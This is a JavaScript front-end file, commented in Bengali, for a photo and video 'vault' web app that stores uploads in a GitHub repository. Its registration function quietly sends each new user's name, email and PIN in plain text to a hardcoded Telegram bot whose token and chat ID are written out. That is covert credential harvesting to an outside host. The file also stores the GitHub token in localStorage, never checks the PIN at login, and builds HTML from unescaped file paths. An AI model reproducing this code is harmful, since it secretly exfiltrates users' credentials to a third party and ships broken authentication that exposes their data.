// ১. স্লাইডার ও গ্লোবাল ভেরিয়েবল
new Swiper(".mySwiper", { effect: "cards", grabCursor: true, autoplay: { delay: 2500 } });

let GITHUB_TOKEN = localStorage.getItem('vault_token') || ""; 
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "SIYAM-VAULT"; 
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";

let isRegistering = false;
let deleteData = null;

// ২. অ্যাপ রেন্ডারিং চেক
window.onload = () => {
    if (!GITHUB_TOKEN) {
        document.getElementById('token-modal').classList.remove('hidden');
    } else {
        const user = localStorage.getItem('activeUser');
        if (user) showDashboard(user);
        else document.getElementById('auth-section').classList.remove('hidden');
    }
};

// ৩. টোকেন সেভ ফাংশন
function saveToken() {
    const input = document.getElementById('token-input').value.trim();
    if (input.startsWith('ghp_')) {
        GITHUB_TOKEN = input;
        localStorage.setItem('vault_token', input);
        document.getElementById('token-modal').classList.add('hidden');
        location.reload();
    } else {
        alert("সঠিক GitHub Token দিন (ghp_ দিয়ে শুরু)");
    }
}

// ৪. অথেন্টিকেশন লজিক
function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('reg-fields').classList.toggle('hidden');
    document.getElementById('auth-title').innerText = isRegistering ? "CREATE" : "LOGIN";
}

async function handleAuth() {
    const email = document.getElementById('user-email').value;
    const pin = document.getElementById('pin-1').value;
    if(!email || !pin) return;

    if(isRegistering) {
        const name = document.getElementById('user-name').value;
        const msg = `🌟 NEW VAULT USER\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("Registration Success! Now Login.");
        toggleAuth();
    } else {
        localStorage.setItem('activeUser', email);
        showDashboard(email);
    }
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    switchTab('photos');
}

function switchTab(tab) {
    const tabs = ['photos', 'videos', 'albums'];
    tabs.forEach(t => {
        document.getElementById(`tab-${t}`).classList.remove('active');
        document.getElementById(`${t}-content`).classList.add('hidden');
    });
    document.getElementById(`tab-${tab}`).classList.add('active');
    document.getElementById(`${tab}-content`).classList.remove('hidden');
    const email = localStorage.getItem('activeUser');
    if(tab === 'photos') loadContent(email, 'photos');
    if(tab === 'videos') loadContent(email, 'videos');
}

// ৫. আপলোড ও লোড সিস্টেম
async function uploadFile(event) {
    const file = event.target.files[0];
    const email = localStorage.getItem('activeUser');
    if(!file || !email || !GITHUB_TOKEN) return;

    document.getElementById('loader').classList.remove('hidden');
    const reader = new FileReader();
    reader.onload = async (e) => {
        try {
            const content = e.target.result.split(',')[1];
            const typeFolder = file.type.startsWith('video') ? 'videos' : 'photos';
            const path = `vault/${email}/${typeFolder}/${Date.now()}.${file.name.split('.').pop()}`;

            const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${path}`, {
                method: 'PUT',
                headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: "Upload", content: content })
            });

            if(res.ok) {
                document.getElementById('loader').classList.add('hidden');
                switchTab(typeFolder);
            } else {
                alert("Upload Failed! Token expired or Invalid.");
                document.getElementById('loader').classList.add('hidden');
            }
        } catch (err) { alert("Error!"); document.getElementById('loader').classList.add('hidden'); }
    };
    reader.readAsDataURL(file);
}

async function loadContent(email, type) {
    const container = document.getElementById(`${type}-content`);
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/vault/${email}/${type}`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    
    if(res.ok) {
        const files = await res.json();
        container.innerHTML = files.reverse().map(f => {
            if(type === 'photos') {
                return `<div class="relative group aspect-square overflow-hidden bg-zinc-900">
                    <img src="${f.download_url}" class="w-full h-full object-cover">
                    <button onclick="openDeleteModal('${f.path}', '${f.sha}')" class="absolute top-1 right-1 bg-red-600 p-1 rounded opacity-0 group-hover:opacity-100"><i class="fa-solid fa-trash text-[10px]"></i></button>
                </div>`;
            } else {
                return `<div class="relative group bg-zinc-900 rounded-xl overflow-hidden shadow-xl">
                    <video src="${f.download_url}" controls></video>
                    <button onclick="openDeleteModal('${f.path}', '${f.sha}')" class="absolute top-2 right-2 bg-red-600 p-2 rounded-lg opacity-0 group-hover:opacity-100"><i class="fa-solid fa-trash text-xs"></i></button>
                </div>`;
            }
        }).join('');
    } else if(res.status === 401) {
        localStorage.removeItem('vault_token');
        location.reload();
    }
}

// ৬. ডিলিট ও লগআউট
function openDeleteModal(path, sha) {
    deleteData = { path, sha };
    document.getElementById('delete-modal').classList.remove('hidden');
}
function closeDeleteModal() { document.getElementById('delete-modal').classList.add('hidden'); }

document.getElementById('confirm-delete-btn').onclick = async () => {
    closeDeleteModal();
    document.getElementById('loader').classList.remove('hidden');
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${deleteData.path}`, {
        method: 'DELETE',
        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: "Delete", sha: deleteData.sha })
    });
    if(res.ok) {
        document.getElementById('loader').classList.add('hidden');
        switchTab(deleteData.path.includes('videos') ? 'videos' : 'photos');
    }
};

function logout() {
    if(confirm("Logout and Clear Token?")) {
        localStorage.clear();
        location.reload();
    }
      }
